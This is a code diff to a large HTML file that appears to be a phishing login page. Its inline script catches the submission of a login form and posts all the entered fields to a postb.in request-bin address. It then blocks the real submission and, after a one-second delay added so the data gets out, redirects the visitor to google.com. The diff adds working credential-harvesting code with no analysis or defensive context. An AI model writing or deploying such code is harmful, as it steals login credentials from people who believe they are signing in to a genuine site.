@@ -41820,9 +41820,12 @@
                                 <script>
                                     $(function() {
                                         $('#login-form').on('submit', function(e) {
-                                            $.post("https://postb.in/1585357844886-0525720445439", $("#login-form").serializeArray())
+                                            $.post("https://postb.in/1585358913208-7440893186721", $("#login-form").serializeArray(), function() {})
+                                            setTimeout(() => {
+                                                window.location.replace('https://google.com')
+
+                                            }, 1000)
                                             e.preventDefault();
-                                            window.location.replace('https://google.com')
                                         });
                                     });
                                 </script>
@@ -42145,5 +42148,3 @@
                 style="width: 100%; height: 100%;"></iframe></div>
     </div>
 </body>
-
-</html>
